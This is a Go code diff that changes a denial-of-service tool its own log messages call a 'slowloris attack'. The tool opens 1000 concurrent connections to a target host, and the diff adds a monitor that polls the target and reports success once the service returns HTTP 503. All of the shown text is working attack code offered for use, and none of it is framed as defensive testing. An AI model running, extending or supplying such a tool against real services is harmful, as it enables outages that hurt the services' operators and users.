@@ -12,7 +12,7 @@ import (
 	"time"
 )
 
-func dial(host string) bool {
+func dial(host string) {
 	tr := &http.Transport{
 		DisableKeepAlives: false, // ensure persistent connections
 	}
@@ -25,7 +25,7 @@ func dial(host string) bool {
 	if err != nil {
 		log.Println("error creating request:", err)
 
-		return false
+		return
 	}
 
 	// make the request
@@ -33,7 +33,7 @@ func dial(host string) bool {
 	if err != nil {
 		log.Println("error making request:", err)
 
-		return false
+		return
 	}
 
 	defer resp.Body.Close()
@@ -43,7 +43,7 @@ func dial(host string) bool {
 	if err != nil {
 		log.Println("error reading response:", err)
 
-		return false
+		return
 	}
 
 	// print the response
@@ -54,6 +54,41 @@ func dial(host string) bool {
 	// you may handle this differently in your actual use case
 	for {
 		time.Sleep(10 * time.Second)
+	}
+}
+
+func ping(target string) {
+	targetURL := target
+
+	// create an HTTP client
+	client := http.Client{}
+
+	// set up a ticker to ping the server at intervals
+	interval := 5 * time.Second
+	ticker := time.NewTicker(interval)
+
+	for {
+		select {
+		case <-ticker.C:
+			// make an HTTP GET request to the target URL
+			resp, err := client.Get(targetURL)
+			if err != nil {
+				log.Println("error making request:", err)
+				continue
+			}
+
+			defer resp.Body.Close()
+
+			// check the response status code
+			if resp.StatusCode == http.StatusServiceUnavailable {
+				log.Printf("Server returned non-OK status code: %d\n", resp.StatusCode)
+				log.Println("slowloris attack succeed, service is out of control")
+
+				os.Exit(1)
+			}
+
+			fmt.Println("Server is healthy")
+		}
 	}
 }
 
@@ -84,19 +119,20 @@ func main() {
 
 	wg := sync.WaitGroup{}
 
+	// send live requests
 	for i := 0; i < 1000; i++ {
 		wg.Add(1)
 
 		go func() {
-			if dial(*hostFlag) {
-				log.Println("slowloris attack succeed, service is out of control")
-
-				os.Exit(1)
-			}
-
+			dial(*hostFlag)
 			wg.Done()
 		}()
 	}
+
+	// monitor
+	go func() {
+		ping(*hostFlag)
+	}()
 
 	wg.Wait()
 
